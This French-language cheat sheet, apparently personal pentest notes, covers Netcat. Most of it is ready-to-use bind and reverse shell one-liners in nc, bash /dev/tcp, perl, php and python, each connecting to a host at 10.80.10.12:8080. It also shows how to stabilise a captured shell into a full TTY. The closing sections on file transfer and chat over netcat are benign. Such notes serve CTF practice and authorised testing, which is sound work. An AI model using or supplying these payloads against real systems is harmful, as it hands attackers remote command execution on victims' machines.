### Connection au shell via Netcat :

nc -lvnp 8080 -e "cmd.exe"
nc -lvnp 8080 -e /bin/bash
	
	Permet de demander a la cible d'écouter un port, et d'executer cmd.exe en cas de connection.

nc 10.80.10.12 8080 -e /bin/bash
nc.exe 10.80.10.12 8080 -e “cmd.exe”

	Syntaxe de connection directe vers une machine à l'écoute


### Connection au shell sans netcat (reverse shell)

bash -i >& /dev/tcp/10.80.10.12/8080 0>&1

	en bash
 

perl -e ‘use Socket;$i=”10.80.10.12″;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’

	Avec perl


php -r ‘$sock=fsockopen(“10.80.10.12”,8080);exec(“/bin/sh -i <&3 >&3 2>&3”);’

	en php (php –version)

  
python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.80.10.12”,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’

	en python (python –version)


l => listener (la machine devra écouter les connections entrantes)
v => verbose output (fournit des informations sur l'état des process)
n => dit à Netcat de ne pas s'occuper du nom de l'hôte ou du/des DNS
p => indique le port que l'on souhaite écouter
e => execute une commande à la connection

### bind shells :

nc  [IP target]  [port number]

	Permet de se connecter à une cible en train d'écouter.

## Stabilisation du shell

*Le shell obtenu par netcat est particulièrement fragile. C'est pourquoi il est nécessaire de le stabiliser par diverses techniques.*

#### 1ère technique sous linux avec utilisation de python :

*Python étant préinstallé sous linux, il est généralement possible de l'utiliser en trois étapes*

1: **```python3 -c 'import pty;pty.spawn("/bin/bash")''```

*Il peut être nécessaire de remplacer "python" par "python2" ou "python3" selon la version installée.* Pour connaître la version : ```python --version``` ou ```python2 --version```

2 : `export TERM=xterm`

*Va nous donner accès aux commandes "term" telles que "clear"*

3 : ```ctrl+Z``` + (dans notre propre terminal) : `stty raw -echo; fg` 

*Désormais, le shell se maintiendra malgré les "ctrl+C", l'utilisation de "TAB" pour compléter nos commandes sera possible, et l'utilisation des flèches également.*

4 : ```reset```
```stty -a``` pour afficher les lignes et colonnes
```stty cols 50```
```stty rows 50```



### Envoyer du texte d'un pc a l'autre via netcat :

Sur le terminal de l’envoyeur :

	$ echo “These are my netcat notes”  >  ncnotes.txt

	$ nc -l  2222 < ncnotes.txt```


Sur le terminal en réception :

	$ nc [machine 1] 2222 > ncnotes.txt

	$ cat ncnotes.txt


### plusieurs fichiers compressés :

Sur le terminal de l’envoyeur :

	$ tar -cvz file1 file2 file3 file4 | nc -l 8080

Sur le terminal en réception :

	$ nc 10.80.10.12 8080 | tar -xvz


### ouvrir une session de tchat :

il suffit de se connecter en bind shell sans préciser d'accès au shell (-e /bin/bash et -e "cmd.exe")